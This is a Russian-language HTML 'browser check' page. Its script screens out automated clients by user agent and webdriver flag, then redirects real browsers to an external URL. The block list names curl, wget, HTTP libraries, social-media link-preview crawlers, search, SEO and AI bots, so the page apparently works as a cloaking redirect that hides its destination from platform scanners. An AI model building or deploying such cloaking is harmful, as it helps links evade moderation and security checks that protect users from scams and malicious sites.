<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Проверка браузера</title>
  <meta name="robots" content="noindex, nofollow, noarchive">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-items: center;
      background:
        radial-gradient(circle at 20% 20%, #442782, transparent 35%),
        radial-gradient(circle at 80% 80%, #006b7b, transparent 35%),
        #0b1020;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    .box {
      width: min(90%, 420px);
      padding: 38px 28px;
      text-align: center;
      border: 1px solid rgba(255,255,255,.16);
      border-radius: 24px;
      background: rgba(255,255,255,.1);
      box-shadow: 0 20px 70px rgba(0,0,0,.35);
      backdrop-filter: blur(16px);
    }

    .loader {
      width: 46px;
      height: 46px;
      margin: 0 auto 22px;
      border: 4px solid rgba(255,255,255,.2);
      border-top-color: #06b6d4;
      border-radius: 50%;
      animation: spin .8s linear infinite;
    }

    h1 {
      margin: 0 0 12px;
      font-size: 24px;
    }

    p {
      margin: 0;
      color: rgba(255,255,255,.7);
      line-height: 1.5;
    }

    .error {
      color: #ff9d9d;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <main class="box">
    <div class="loader" id="loader"></div>
    <h1 id="title">Проверяем браузер</h1>
    <p id="message">Пожалуйста, подождите…</p>
  </main>

  <script>
    (() => {
      "use strict";

      const targetUrl = "https://dalam.world/?__Thalina_Enter";

      const title = document.getElementById("title");
      const message = document.getElementById("message");
      const loader = document.getElementById("loader");

      function reject(reason) {
        loader.style.display = "none";
        title.textContent = "Проверка не пройдена";
        message.textContent = reason || "Автоматический переход недоступен.";
        message.classList.add("error");
      }

      function checkBrowser() {
        // JavaScript должен быть включён
        if (!window || !document || !navigator) {
          return false;
        }

        // Частый признак автоматизированного браузера
        if (navigator.webdriver === true) {
          return false;
        }

        const userAgent = navigator.userAgent.toLowerCase();

        // Явные поисковые и автоматизированные клиенты
        const botPattern = [
  // Общие боты и сканеры
  "bot",
  "bots",
  "crawler",
  "crawl",
  "spider",
  "slurp",
  "scraper",
  "headless",
  "phantom",
  "selenium",
  "webdriver",
  "puppeteer",
  "playwright",

  // HTTP-клиенты и библиотеки
  "curl",
  "wget",
  "httpclient",
  "python-requests",
  "python-urllib",
  "aiohttp",
  "go-http-client",
  "libwww-perl",
  "okhttp",

  // Meta: Facebook, Instagram, Messenger, WhatsApp
  "facebookexternalhit",
  "facebot",
  "facebookcatalog",
  "meta-externalagent",
  "meta-externalfetcher",
  "meta-externalads",
  "meta-webindexer",
  "instagram",

  // X / Twitter
  "twitterbot",

  // LinkedIn
  "linkedinbot",
  "linkedin-crawler",

  // Telegram
  "telegrambot",

  // Pinterest
  "pinterest",
  "pinterestbot",

  // Discord
  "discordbot",

  // Reddit
  "redditbot",

  // Slack
  "slackbot",

  // Google и Microsoft
  "googlebot",
  "google-extended",
  "adsbot-google",
  "mediapartners-google",
  "bingbot",
  "bingpreview",

  // SEO-сервисы
  "semrushbot",
  "ahrefsbot",
  "mj12bot",
  "dotbot",
  "petalbot",
  "yandexbot",
  "bytespider",

  // AI-боты
  "gptbot",
  "chatgpt-user",
  "oai-searchbot",
  "claudebot",
  "anthropic-ai",
  "perplexitybot",
  "google-extended",
  "ccbot",
  "amazonbot"
];


        if (botPattern.some(item => userAgent.includes(item))) {
          return false;
        }

        // В браузере должна быть нормальная аппаратная среда
        if (!navigator.language || !navigator.userAgent) {
          return false;
        }

        if (!screen || screen.width < 200 || screen.height < 200) {
          return false;
        }

        return true;
      }

      // Даём странице немного времени на выполнение проверки
      setTimeout(() => {
        if (!checkBrowser()) {
          reject("Откройте страницу в обычном браузере.");
          return;
        }

        title.textContent = "Проверка пройдена";
        message.textContent = "Перенаправляем…";

        setTimeout(() => {
          window.location.replace(targetUrl);
        }, 500);
      }, 1200);
    })();
  </script>
</body>
</html>
